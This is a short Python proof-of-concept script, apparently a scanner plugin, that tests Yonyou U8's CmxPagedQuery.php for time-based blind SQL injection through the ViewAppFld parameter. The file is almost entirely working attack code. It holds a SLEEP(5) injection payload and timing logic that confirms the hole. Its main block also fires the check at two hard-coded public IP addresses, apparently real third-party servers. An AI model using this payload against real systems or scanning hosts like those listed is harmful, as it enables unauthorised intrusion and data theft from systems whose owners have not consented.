#/usr/bin/python
#-*- coding: utf-8 -*-


"""

POC Name  : 用友u8 CmxPagedQuery.php参数ViewAppFld存在sql注入
Author    :  a
mail      :  a@lcx.cc
Refer     : http://www.wooyun.org/bugs/wooyun-2015-156891


"""
import time
def assign(service, arg):
    if service == "yongyou_u8":
        return True, arg    

def audit(arg):
    path="Server/CmxPagedQuery.php?pgid=AppList"
    target = arg +path
    fst_sta=time.time()
    code1, head, res, errcode, _url = curl.curl2(target)
    fst_end=time.time()

    
    payload="ViewAppFld=1) AND (SELECT * FROM (SELECT(SLEEP(5)))Tzqe) AND (6547=6547&ViewAppValue=2"
    target = arg +path
    sec_sta=time.time()
    code2, head, res, errcode, _url = curl.curl2(target,payload)
    sec_end=time.time()
    
    fst=fst_end-fst_sta
    sec=sec_end-sec_sta
    if code1!=0 and code2!=0 and 4.01<sec-fst<6.0:
            security_hole(arg +path)

            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_u8','http://58.217.117.20:81/')[1])
    audit(assign('yongyou_u8','http://221.238.243.237:8000/')[1])